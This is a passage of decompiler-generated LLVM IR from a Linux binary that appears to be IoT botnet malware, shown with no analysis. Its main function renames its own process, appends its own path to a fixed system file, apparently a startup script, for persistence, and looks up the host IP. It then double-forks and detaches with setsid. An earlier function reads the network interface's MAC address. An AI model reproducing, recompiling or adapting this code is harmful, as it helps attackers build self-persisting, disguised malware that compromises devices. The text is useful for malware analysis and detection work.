  br label %dec_label_pc_804f7d6

dec_label_pc_804f79c:                             ; preds = %dec_label_pc_804f762
  %v6_804f7b0 = call i32 @__GI_memset(i8* nonnull %stack_var_-4156, i32 0, i32 4096)
  %v5_804f7ca = call i32 @fdgets(i32 %v2_804f7b8, i32 4096, i32 %v5_804f755)
  %v1_804f7d2 = icmp eq i32 %v5_804f7ca, 0
  %v1_804f7d4 = icmp eq i1 %v1_804f7d2, false
  br i1 %v1_804f7d4, label %dec_label_pc_804f762, label %dec_label_pc_804f7d6

dec_label_pc_804f7d6:                             ; preds = %dec_label_pc_804f743, %dec_label_pc_804f79c, %dec_label_pc_804f794
  %v2_804f7dc = call i32 @__libc_close(i32 %v5_804f755)
  %v3_804f7e4 = load i8, i8* %stack_var_-4156, align 1
  %v4_804f7ea = icmp eq i8 %v3_804f7e4, 0
  br i1 %v4_804f7ea, label %dec_label_pc_804f84d, label %dec_label_pc_804f7ee

dec_label_pc_804f7ee:                             ; preds = %dec_label_pc_804f7d6
  %v2_804f7f8 = ptrtoint i32* %stack_var_-4188 to i32
  store i32 %v2_804f7f8, i32* @eax, align 4
  %tmp39 = bitcast i32* %stack_var_-4188 to i8*
  %v5_804f7ff = call i32 @strcpy(i8* %tmp39, i32 %v2_804f7b8)
  %v5_804f819 = call i32 @ioctl(i32 %v5_804f67a, i32 35111, i32 %v2_804f7f8)
  %v2_804f833 = ptrtoint i32* %stack_var_-4170 to i32
  br label %dec_label_pc_804f82a

dec_label_pc_804f82a:                             ; preds = %dec_label_pc_804f7ee, %dec_label_pc_804f82a
  %storemerge40 = phi i32 [ 0, %dec_label_pc_804f7ee ], [ %v4_804f844, %dec_label_pc_804f82a ]
  %v2_804f839 = add i32 %storemerge40, %v2_804f833
  %v1_804f83c = inttoptr i32 %v2_804f839 to i8*
  %v2_804f83c = load i8, i8* %v1_804f83c, align 1
  %v3_804f83e = add i32 %storemerge40, ptrtoint (i8** @global_var_805b550.439 to i32)
  %v4_804f83e = inttoptr i32 %v3_804f83e to i8*
  store i8 %v2_804f83c, i8* %v4_804f83e, align 1
  %v4_804f844 = add nuw nsw i32 %storemerge40, 1
  %exitcond = icmp eq i32 %v4_804f844, 6
  br i1 %exitcond, label %dec_label_pc_804f84d.loopexit, label %dec_label_pc_804f82a

dec_label_pc_804f84d.loopexit:                    ; preds = %dec_label_pc_804f82a
  br label %dec_label_pc_804f84d

dec_label_pc_804f84d:                             ; preds = %dec_label_pc_804f84d.loopexit, %dec_label_pc_804f7d6
  %v2_804f853 = call i32 @__libc_close(i32 %v5_804f67a)
  %v3_804f869.pre = load i32, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804f869

dec_label_pc_804f85d:                             ; preds = %dec_label_pc_804f70e, %dec_label_pc_804f69a, %entry
  store i32 0, i32* %stack_var_-4204, align 4
  br label %dec_label_pc_804f869

dec_label_pc_804f869:                             ; preds = %dec_label_pc_804f84d, %dec_label_pc_804f85d
  %v3_804f869 = phi i32 [ %v3_804f869.pre, %dec_label_pc_804f84d ], [ 0, %dec_label_pc_804f85d ]
  ret i32 %v3_804f869

; uselistorder directives
  uselistorder i32 %v5_804f788, { 1, 0 }
  uselistorder i32 %v2_804f7b8, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v5_804f755, { 2, 1, 0 }
  uselistorder i32 %v5_804f67a, { 2, 1, 3, 4, 0 }
  uselistorder i32* %stack_var_-4204, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i8* %stack_var_-4156, { 4, 2, 0, 1, 3 }
  uselistorder i8 9, { 1, 0, 2, 3 }
  uselistorder i32 (i32)* @htons, { 10, 9, 8, 7, 6, 5, 4, 11, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804f869, { 1, 0 }
  uselistorder label %dec_label_pc_804f82a, { 1, 0 }
  uselistorder label %dec_label_pc_804f7d6, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804f788, { 1, 0 }
  uselistorder label %dec_label_pc_804f762, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([6 x i8]* @global_var_8058c64.440 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i8*, align 4
  %tmp104 = call i8* @__decompiler_undefined_function_2()
  %tmp113 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-512 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-5888 = alloca i8*, align 4
  %stack_var_-5872 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_804f87b = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804f87b, i32* %stack_var_-24, align 4
  %v5_804f88c = icmp ult i32* %stack_var_-24, inttoptr (i32 5848 to i32*)
  store i1 %v5_804f88c, i1* %cf.global-to-local, align 1
  store i32 %v2_804f87b, i32* %edx.global-to-local, align 4
  %v1_804f8a5 = add i32 %v2_804f87b, 4
  %v2_804f8a5 = inttoptr i32 %v1_804f8a5 to i32*
  %v3_804f8a5 = load i32, i32* %v2_804f8a5, align 4
  store i32 %v3_804f8a5, i32* %eax.global-to-local, align 4
  %v1_804f8a8 = inttoptr i32 %v3_804f8a5 to i32*
  %v2_804f8a8 = load i32, i32* %v1_804f8a8, align 4
  %v1_804f8b5 = and i32 %v2_804f8a8, -256
  store i32 %v1_804f8b5, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804f8b8 = inttoptr i32 %v2_804f8a8 to i8*
  store i32 %v2_804f8a8, i32* @edi, align 4
  %v3_804f8be = call i32 @_strlen(i8* %v4_804f8b8)
  %v4_804f8be = mul i32 %v3_804f8be, -1
  %v1_804f8c2 = sub i32 1, %v4_804f8be
  store i32 %v1_804f8c2, i32* %eax.global-to-local, align 4
  %v1_804f8c4 = sub i32 0, %v4_804f8be
  store i32 %v1_804f8c4, i32* %edx.global-to-local, align 4
  %v3_804f8cd = load i32, i32* %v2_804f8a5, align 4
  store i32 %v3_804f8cd, i32* %eax.global-to-local, align 4
  %v1_804f8d0 = inttoptr i32 %v3_804f8cd to i32*
  %v2_804f8d0 = load i32, i32* %v1_804f8d0, align 4
  store i32 %v2_804f8d0, i32* %eax.global-to-local, align 4
  %v0_804f8d2 = load i32, i32* @esp, align 4
  %v5_804f8d2 = icmp ult i32 %v0_804f8d2, 4
  store i1 %v5_804f8d2, i1* %cf.global-to-local, align 1
  %v5_804f8db = inttoptr i32 %v2_804f8d0 to i8*
  store i8* %v5_804f8db, i8** %stack_var_-5888, align 4
  %v5_804f8dc = call i32 @strncpy(i8* %v5_804f8db, i32 ptrtoint (i32* @global_var_8058c6a.441 to i32), i32 %v1_804f8c4)
  store i32 %v5_804f8dc, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8058c6a.441 to i32), i32* %edx.global-to-local, align 4
  store i32 %v2_804f87b, i32* @esi, align 4
  %v3_804f8ef = load i32, i32* %v2_804f8a5, align 4
  %v2_804f8f2 = inttoptr i32 %v3_804f8ef to i32*
  store i32 ptrtoint (i32* @global_var_8058c6a.441 to i32), i32* %v2_804f8f2, align 4
  store i32 ptrtoint (i32* @global_var_8058c6a.441 to i32), i32* %eax.global-to-local, align 4
  %v0_804f8f7 = load i32, i32* @esp, align 4
  %v5_804f8f7 = icmp ult i32 %v0_804f8f7, 12
  store i1 %v5_804f8f7, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v6_804f903 = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_8058c6a.441 to i32), i32 0, i32 0, i32 0)
  store i32 %v6_804f903, i32* %eax.global-to-local, align 4
  %v5_804f90b = icmp ult i32* %stack_var_-5872, inttoptr (i32 12 to i32*)
  store i1 %v5_804f90b, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v3_804f910 = call i32 @__GI_time(i32* null)
  store i32 %v3_804f910, i32* %eax.global-to-local, align 4
  %v0_804f915 = load i32, i32* @esp, align 4
  %v2_804f915 = icmp ugt i32 %v0_804f915, -17
  store i1 %v2_804f915, i1* %cf.global-to-local, align 1
  store i32 %v3_804f910, i32* @ebx, align 4
  %v0_804f91a = call i32 @__libc_getpid()
  %v1_804f91f = load i32, i32* @ebx, align 4
  %v2_804f91f = xor i32 %v1_804f91f, %v0_804f91a
  store i32 %v2_804f91f, i32* @eax, align 4
  %v0_804f921 = load i32, i32* @esp, align 4
  %v5_804f921 = icmp ult i32 %v0_804f921, 12
  store i1 %v5_804f921, i1* %cf.global-to-local, align 1
  %v5_804f924 = inttoptr i32 %v2_804f91f to i8*
  store i8* %v5_804f924, i8** %stack_var_-5888, align 4
  %v2_804f925 = call i32 @srand(i32 %v2_804f91f)
  store i32 %v2_804f925, i32* %eax.global-to-local, align 4
  store i1 %v5_804f90b, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v3_804f932 = call i32 @__GI_time(i32* null)
  store i32 %v3_804f932, i32* %eax.global-to-local, align 4
  %v0_804f937 = load i32, i32* @esp, align 4
  %v2_804f937 = icmp ugt i32 %v0_804f937, -17
  store i1 %v2_804f937, i1* %cf.global-to-local, align 1
  store i32 %v3_804f932, i32* @ebx, align 4
  %v0_804f93c = call i32 @__libc_getpid()
  %v1_804f941 = load i32, i32* @ebx, align 4
  %v2_804f941 = xor i32 %v1_804f941, %v0_804f93c
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_804f941, i32* %eax.global-to-local, align 4
  %v1_804f944 = call i32 @init_rand(i32 %v2_804f941)
  store i32 %v1_804f944, i32* @eax, align 4
  %v5_804f95a = icmp ult i32* %stack_var_-5872, inttoptr (i32 8 to i32*)
  store i1 %v5_804f95a, i1* %cf.global-to-local, align 1
  %tmp160 = bitcast i8** %stack_var_-5888 to i32*
  store i32 ptrtoint ([19 x i8]* @global_var_8058c6b.442 to i32), i32* %tmp160, align 4
  %v3_804f965 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_8058c6b.442 to i32), i32 ptrtoint (i32* @global_var_8058c7e.443 to i32))
  store i32 %v3_804f965, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f970 = icmp eq i32 %v3_804f965, 0
  %v1_804f974 = icmp eq i1 %v4_804f970, false
  br i1 %v1_804f974, label %dec_label_pc_804f993, label %dec_label_pc_804f976

dec_label_pc_804f976:                             ; preds = %entry
  store i1 %v5_804f95a, i1* %cf.global-to-local, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_8058c80.444 to i32), i32* %tmp160, align 4
  %v3_804f988 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_8058c80.444 to i32), i32 ptrtoint (i32* @global_var_8058c7e.443 to i32))
  store i32 %v3_804f988, i32* %eax.global-to-local, align 4
  %v0_804f98d = load i32, i32* @esp, align 4
  %v2_804f98d = icmp ugt i32 %v0_804f98d, -17
  store i1 %v2_804f98d, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f993

dec_label_pc_804f993:                             ; preds = %entry, %dec_label_pc_804f976
  %stack_var_-88.0 = phi i32 [ %v3_804f965, %entry ], [ %v3_804f988, %dec_label_pc_804f976 ]
  %v3_804fae313 = phi i32 [ ptrtoint ([19 x i8]* @global_var_8058c6b.442 to i32), %entry ], [ ptrtoint ([13 x i8]* @global_var_8058c80.444 to i32), %dec_label_pc_804f976 ]
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f993 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_804f993, label %dec_label_pc_804fb3a, label %dec_label_pc_804f99d

dec_label_pc_804f99d:                             ; preds = %dec_label_pc_804f993
  %v3_804f9a3 = load i32, i32* %v2_804f8a5, align 4
  store i32 %v3_804f9a3, i32* %eax.global-to-local, align 4
  %v1_804f9a6 = inttoptr i32 %v3_804f9a3 to i32*
  %v2_804f9a6 = load i32, i32* %v1_804f9a6, align 4
  %v1_804f9b3 = and i32 %v2_804f9a6, -256
  store i32 %v1_804f9b3, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_804f9b6 = inttoptr i32 %v2_804f9a6 to i8*
  store i32 %v2_804f9a6, i32* @edi, align 4
  %v3_804f9bc = call i32 @_strlen(i8* %v4_804f9b6)
  %v0_804f9cd = load i32, i32* @esp, align 4
  %v5_804f9cd = icmp ult i32 %v0_804f9cd, 8
  store i1 %v5_804f9cd, i1* %cf.global-to-local, align 1
  %v2_804f9d5 = ptrtoint i32* %stack_var_-368 to i32
  store i32 %v2_804f9d5, i32* %eax.global-to-local, align 4
  %tmp161 = bitcast i32* %stack_var_-368 to i8*
  store i8* %tmp161, i8** %stack_var_-5888, align 4
  %v3_804f9dc = call i32 @getcwd(i32 %v2_804f9d5, i32 256)
  %v0_804f9e1 = load i32, i32* @esp, align 4
  %v2_804f9e1 = icmp ugt i32 %v0_804f9e1, -17
  store i1 %v2_804f9e1, i1* %cf.global-to-local, align 1
  store i32 %v2_804f9d5, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v2_804f9d5, i32* @esi, align 4
  store i32 ptrtoint (i8** @global_var_8058c8d.445 to i32), i32* @edi, align 4
  %v7_804fa17 = call i32 @_strncmp(i8* %tmp161, i8* bitcast (i8** @global_var_8058c8d.445 to i8*), i32 2)
  %v8_804fa17 = urem i32 %v7_804fa17, 2
  %v9_804fa17 = icmp eq i32 %v8_804fa17, 0
  %v0_804fa19 = load i1, i1* %cf.global-to-local, align 1
  %v2_804fa19 = or i1 %v0_804fa19, %v9_804fa17
  %v3_804fa19 = zext i1 %v2_804fa19 to i32
  %v4_804fa19 = load i32, i32* @edx, align 4
  %v5_804fa19 = and i32 %v4_804fa19, -256
  %v6_804fa19 = or i32 %v3_804fa19, %v5_804fa19
  %v7_804fa19 = xor i32 %v6_804fa19, 1
  store i32 %v7_804fa19, i32* %edx.global-to-local, align 4
  %v5_804fa1c = ptrtoint i32* %stack_var_-512 to i32
  %v3_804fa1f = and i32 %v7_804fa17, -256
  %v1_804fa21 = trunc i32 %v7_804fa19 to i8
  %v3_804fa21 = trunc i32 %v5_804fa1c to i8
  %v4_804fa21 = sub i8 %v1_804fa21, %v3_804fa21
  %v15_804fa21 = icmp eq i8 %v4_804fa21, 0
  %v20_804fa21 = zext i8 %v4_804fa21 to i32
  %v23_804fa21 = or i32 %v20_804fa21, %v3_804fa1f
  store i32 %v23_804fa21, i32* @ecx, align 4
  %v2_804fa25 = sext i8 %v4_804fa21 to i32
  store i32 %v2_804fa25, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v15_804fa21, label %dec_label_pc_804fb2c, label %dec_label_pc_804fa35.preheader

dec_label_pc_804fa35.preheader:                   ; preds = %dec_label_pc_804f99d
  br label %dec_label_pc_804fa35

dec_label_pc_804fa32:                             ; preds = %dec_label_pc_804fa35
  %v4_804fa32 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_804fa35

dec_label_pc_804fa35:                             ; preds = %dec_label_pc_804fa35.preheader, %dec_label_pc_804fa32
  %stack_var_-84.0 = phi i32 [ %v4_804fa32, %dec_label_pc_804fa32 ], [ %v3_804f9bc, %dec_label_pc_804fa35.preheader ]
  store i32 %v2_804f87b, i32* @esi, align 4
  %v3_804fa3b = load i32, i32* %v2_804f8a5, align 4
  store i32 %v3_804fa3b, i32* %eax.global-to-local, align 4
  %v1_804fa3e = inttoptr i32 %v3_804fa3b to i32*
  %v2_804fa3e = load i32, i32* %v1_804fa3e, align 4
  store i32 %v2_804fa3e, i32* %edx.global-to-local, align 4
  %v2_804fa43 = add i32 %v2_804fa3e, %stack_var_-84.0
  store i32 %v2_804fa43, i32* %eax.global-to-local, align 4
  %v1_804fa46 = inttoptr i32 %v2_804fa43 to i8*
  %v2_804fa46 = load i8, i8* %v1_804fa46, align 1
  %v3_804fa46 = zext i8 %v2_804fa46 to i32
  %v5_804fa46 = and i32 %v2_804fa43, -256
  %v6_804fa46 = or i32 %v3_804fa46, %v5_804fa46
  store i32 %v6_804fa46, i32* %eax.global-to-local, align 4
  %v6_804fa48 = icmp ult i8 %v2_804fa46, 47
  store i1 %v6_804fa48, i1* %cf.global-to-local, align 1
  %v10_804fa48 = icmp eq i8 %v2_804fa46, 47
  %v1_804fa4a = icmp eq i1 %v10_804fa48, false
  br i1 %v1_804fa4a, label %dec_label_pc_804fa32, label %dec_label_pc_804fa4c

dec_label_pc_804fa4c:                             ; preds = %dec_label_pc_804fa35
  store i32 %v2_804f87b, i32* @edi, align 4
  %v3_804fa52 = load i32, i32* %v2_804f8a5, align 4
  store i32 %v3_804fa52, i32* %eax.global-to-local, align 4
  %v1_804fa55 = inttoptr i32 %v3_804fa52 to i32*
  %v2_804fa55 = load i32, i32* %v1_804fa55, align 4
  store i32 %v2_804fa55, i32* %edx.global-to-local, align 4
  %v2_804fa5a = add i32 %v2_804fa55, %stack_var_-84.0
  %v2_804fa6a = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_804fa6a, i32* %eax.global-to-local, align 4
  %tmp162 = bitcast i32* %stack_var_-624 to i8*
  store i8* %tmp162, i8** %stack_var_-5888, align 4
  %v5_804fa71 = call i32 @sprintf(i32 %v2_804fa6a, i32 ptrtoint ([8 x i8]* @global_var_8058c8f.446 to i32), i32 %v2_804f9d5, i32 %v2_804fa5a)
  store i32 %v5_804fa71, i32* %eax.global-to-local, align 4
  %v0_804fa76 = load i32, i32* @esp, align 4
  %v2_804fa76 = icmp ugt i32 %v0_804fa76, -17
  store i1 %v2_804fa76, i1* %cf.global-to-local, align 1
  %v8_804fab8 = inttoptr i32 %stack_var_-88.0 to i8*
  %tmp163 = inttoptr i32 %stack_var_-88.0 to i32*
  %v2_804fa86 = ptrtoint i32* %stack_var_-1648 to i32
  %tmp164 = bitcast i32* %stack_var_-1648 to i8*
  %v5_804fa7b = icmp ult i32* %stack_var_-5872, inttoptr (i32 4 to i32*)
  br label %dec_label_pc_804fab5.outer

dec_label_pc_804fa7b:                             ; preds = %dec_label_pc_804fab5
  store i1 %v5_804fa7b, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa86, i32* %eax.global-to-local, align 4
  store i8* %tmp164, i8** %stack_var_-5888, align 4
  %v4_804fa8d = call i32 @fgets(i32 %v2_804fa86, i32 1024, i32 %stack_var_-88.0)
  store i1 %v5_804f95a, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa86, i32* %eax.global-to-local, align 4
  store i8* %tmp164, i8** %stack_var_-5888, align 4
  %v4_804faa6 = call i32 @__GI_strcasecmp(i8* %tmp164, i32 %v2_804fa6a)
  store i32 %v4_804faa6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804faae = icmp eq i32 %v4_804faa6, 0
  %v1_804fab0 = icmp eq i1 %v1_804faae, false
  br i1 %v1_804fab0, label %dec_label_pc_804fab5, label %dec_label_pc_804fab2

dec_label_pc_804fab2:                             ; preds = %dec_label_pc_804fa7b
  %v4_804fab2 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804fab5.outer

dec_label_pc_804fab5.outer:                       ; preds = %dec_label_pc_804fab2, %dec_label_pc_804fa4c
  %stack_var_-80.0.ph = phi i32 [ %v4_804fab2, %dec_label_pc_804fab2 ], [ 0, %dec_label_pc_804fa4c ]
  br label %dec_label_pc_804fab5

dec_label_pc_804fab5:                             ; preds = %dec_label_pc_804fab5.outer, %dec_label_pc_804fa7b
  store i1 %v5_804f90b, i1* %cf.global-to-local, align 1
  store i8* %v8_804fab8, i8** %stack_var_-5888, align 4
  %v3_804fabb = call i32 @feof(i32* %tmp163)
  store i32 %v3_804fabb, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fac3 = icmp eq i32 %v3_804fabb, 0
  br i1 %v1_804fac3, label %dec_label_pc_804fa7b, label %dec_label_pc_804fac7

dec_label_pc_804fac7:                             ; preds = %dec_label_pc_804fab5
  %v4_804fac7 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v1_804facb = icmp eq i1 %v4_804fac7, false
  store i1 %v5_804f90b, i1* %cf.global-to-local, align 1
  store i8* %v8_804fab8, i8** %stack_var_-5888, align 4
  %tmp165 = inttoptr i32 %stack_var_-88.0 to i16*
  %v3_804fb22 = call i32 @__GI_fclose(i16* %tmp165)
  store i32 %v3_804fb22, i32* @eax, align 4
  %v0_804fb27 = load i32, i32* @esp, align 4
  %v2_804fb27 = icmp ugt i32 %v0_804fb27, -17
  store i1 %v2_804fb27, i1* %cf.global-to-local, align 1
  br i1 %v1_804facb, label %dec_label_pc_804fb3a, label %dec_label_pc_804facd

dec_label_pc_804facd:                             ; preds = %dec_label_pc_804fac7
  store i1 %v5_804f95a, i1* %cf.global-to-local, align 1
  store i32 %v3_804fae313, i32* %tmp160, align 4
  %v3_804fae6 = call i32 @__GI_fopen(i32 %v3_804fae313, i32 ptrtoint (i32* @global_var_8058c97.447 to i32))
  store i32 %v3_804fae6, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804faf1 = icmp eq i32 %v3_804fae6, 0
  br i1 %v4_804faf1, label %dec_label_pc_804fb3a, label %dec_label_pc_804faf7

dec_label_pc_804faf7:                             ; preds = %dec_label_pc_804facd
  store i1 %v5_804f95a, i1* %cf.global-to-local, align 1
  store i32 %v2_804fa6a, i32* %eax.global-to-local, align 4
  store i8* %tmp162, i8** %stack_var_-5888, align 4
  %v3_804fb04 = call i32 @__GI_fputs(i32 %v2_804fa6a, i32 %v3_804fae6)
  store i32 %v3_804fb04, i32* @eax, align 4
  store i1 %v5_804f90b, i1* %cf.global-to-local, align 1
  %v8_804fb0f = inttoptr i32 %v3_804fae6 to i8*
  store i8* %v8_804fb0f, i8** %stack_var_-5888, align 4
  %tmp166 = inttoptr i32 %v3_804fae6 to i16*
  %v3_804fb12 = call i32 @__GI_fclose(i16* %tmp166)
  store i32 %v3_804fb12, i32* %eax.global-to-local, align 4
  %v0_804fb17 = load i32, i32* @esp, align 4
  %v2_804fb17 = icmp ugt i32 %v0_804fb17, -17
  store i1 %v2_804fb17, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804fb3a

dec_label_pc_804fb2c:                             ; preds = %dec_label_pc_804f99d
  %v0_804fb2c = load i32, i32* @esp, align 4
  %v5_804fb2c = icmp ult i32 %v0_804fb2c, 12
  store i1 %v5_804fb2c, i1* %cf.global-to-local, align 1
  %v8_804fb2f = inttoptr i32 %stack_var_-88.0 to i8*
  store i8* %v8_804fb2f, i8** %stack_var_-5888, align 4
  %tmp167 = inttoptr i32 %stack_var_-88.0 to i16*
  %v3_804fb32 = call i32 @__GI_fclose(i16* %tmp167)
  store i32 %v3_804fb32, i32* %eax.global-to-local, align 4
  %v0_804fb37 = load i32, i32* @esp, align 4
  %v2_804fb37 = icmp ugt i32 %v0_804fb37, -17
  store i1 %v2_804fb37, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804fb3a

dec_label_pc_804fb3a:                             ; preds = %dec_label_pc_804fac7, %dec_label_pc_804facd, %dec_label_pc_804f993, %dec_label_pc_804faf7, %dec_label_pc_804fb2c
  %v0_804fb3a = call i32 @getOurIP()
  store i32 %v0_804fb3a, i32* %eax.global-to-local, align 4
  %v0_804fb3f = load i8*, i8** %stack_var_-5888, align 4
  %v1_804fb3f = ptrtoint i8* %v0_804fb3f to i32
  %v2_804fb3f = call i32 @__libc_fork(i32 %v1_804fb3f)
  store i32 %v2_804fb3f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fb47 = icmp eq i32 %v2_804fb3f, 0
  br i1 %v4_804fb47, label %dec_label_pc_804fb71, label %dec_label_pc_804fba2

dec_label_pc_804fb71:                             ; preds = %dec_label_pc_804fb3a
  store i1 false, i1* %cf.global-to-local, align 1
  %v0_804fb71 = load i8*, i8** %stack_var_-5888, align 4
  %v1_804fb71 = ptrtoint i8* %v0_804fb71 to i32
  %v2_804fb71 = call i32 @__libc_fork(i32 %v1_804fb71)
  store i32 %v2_804fb71, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fb79 = icmp eq i32 %v2_804fb71, 0
  br i1 %v4_804fb79, label %dec_label_pc_804fb89.thread, label %dec_label_pc_804fb8f

dec_label_pc_804fb89.thread:                      ; preds = %dec_label_pc_804fb71
  store i1 false, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804fbb3

dec_label_pc_804fb8f:                             ; preds = %dec_label_pc_804fb71
  %v0_804fb7f = load i32, i32* @esp, align 4
  %v5_804fb7f = icmp ult i32 %v0_804fb7f, 12
  store i1 %v5_804fb7f, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v2_804fb84 = call i32 @__GI_exit(i32 0)
  store i32 ptrtoint ([13 x i8]* @global_var_8058c99.448 to i32), i32* %eax.global-to-local, align 4
  %v0_804fb94 = load i32, i32* @esp, align 4
  %v5_804fb94 = icmp ult i32 %v0_804fb94, 12
  store i1 %v5_804fb94, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8058c99.448, i32 0, i32 0), i8** %stack_var_-5888, align 4
  %v2_804fb98 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_8058c99.448 to i32))
  store i32 %v2_804fb98, i32* %eax.global-to-local, align 4
  %v0_804fb9d = load i32, i32* @esp, align 4
  %v2_804fb9d = icmp ugt i32 %v0_804fb9d, -17
  store i1 %v2_804fb9d, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804fbb3

dec_label_pc_804fba2:                             ; preds = %dec_label_pc_804fb3a
  %v0_804fb4d = load i32, i32* @esp, align 4
  %v5_804fb4d = icmp ult i32 %v0_804fb4d, 4
  store i1 %v5_804fb4d, i1* %cf.global-to-local, align 1
  %v2_804fb52 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_804fb52, i32* %eax.global-to-local, align 4
  %v8_804fb56 = inttoptr i32 %v2_804fb3f to i8*
  store i8* %v8_804fb56, i8** %stack_var_-5888, align 4
  %v4_804fb59 = call i32 @__libc_waitpid(i32 %v2_804fb3f, i32 %v2_804fb52, i32 0)
  store i32 %v4_804fb59, i32* @eax, align 4
  store i1 %v5_804f90b, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-5888, align 4
  %v2_804fb66 = call i32 @__GI_exit(i32 0)
  store i32 ptrtoint ([13 x i8]* @global_var_8058c99.448 to i32), i32* %eax.global-to-local, align 4
  %v0_804fba7 = load i32, i32* @esp, align 4
  %v5_804fba7 = icmp ult i32 %v0_804fba7, 12
  store i1 %v5_804fba7, i1* %cf.global-to-local, align 1
  store i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_8058c99.448, i32 0, i32 0), i8** %stack_var_-5888, align 4
  %v2_804fbab = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_8058c99.448 to i32))
  store i32 %v2_804fbab, i32* %eax.global-to-local, align 4
  %v0_804fbb0 = load i32, i32* @esp, align 4
  %v2_804fbb0 = icmp ugt i32 %v0_804fbb0, -17
  store i1 %v2_804fbb0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804fbb3

dec_label_pc_804fbb3:                             ; preds = %dec_label_pc_804fb89.thread, %dec_label_pc_804fb8f, %dec_label_pc_804fba2
  %v0_804fbb3 = call i32 @__GI_setsid()
  store i32 %v0_804fbb3, i32* %eax.global-to-local, align 4
  %v0_804fbb8 = load i32, i32* @esp, align 4
  %v5_804fbb8 = icmp ult i32 %v0_804fbb8, 12
  store i1 %v5_804fbb8, i1* %cf.global-to-local, align 1
  store i8* bitcast (i8** @global_var_8058c8d.445 to i8*), i8** %stack_var_-5888, align 4
  %v2_804fbc0 = call i32 @chdir(i32 ptrtoint (i8** @global_var_8058c8d.445 to i32))
  store i32 %v2_804fbc0, i32* %eax.global-to-local, align 4
  store i1 %v5_804f95a, i1* %cf.global-to-local, align 1
  store i8* inttoptr (i32 13 to i8*), i8** %stack_var_-5888, align 4
  %v3_804fbcf = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 %v3_804fbcf, i32* %eax.global-to-local, align 4
  %v0_804fbd4 = load i32, i32* @esp, align 4
  %v2_804fbd4 = icmp ugt i32 %v0_804fbd4, -17
  store i1 %v2_804fbd4, i1* %cf.global-to-local, align 1
  %v2_8050291 = ptrtoint i32* %stack_var_-5744 to i32
  %tmp168 = bitcast i32* %stack_var_-5744 to i8*
  %tmp169 = bitcast i8** %stack_var_-36 to i32*
  %v2_8050248 = ptrtoint i32* %stack_var_-624 to i32
  %v2_8050084 = ptrtoint i32* %stack_var_-1648 to i32
  %v5_804fef7 = and i32 %v2_8050291, -256
  %v1_804ff04 = or i32 %v2_8050291, 1
  %storemerge16190 = inttoptr i32 %v1_804ff04 to i8*
  br label %dec_label_pc_804fbd9.outer

dec_label_pc_804fbd9.outer:                       ; preds = %dec_label_pc_804fec3, %dec_label_pc_8050291, %dec_label_pc_804fbb3
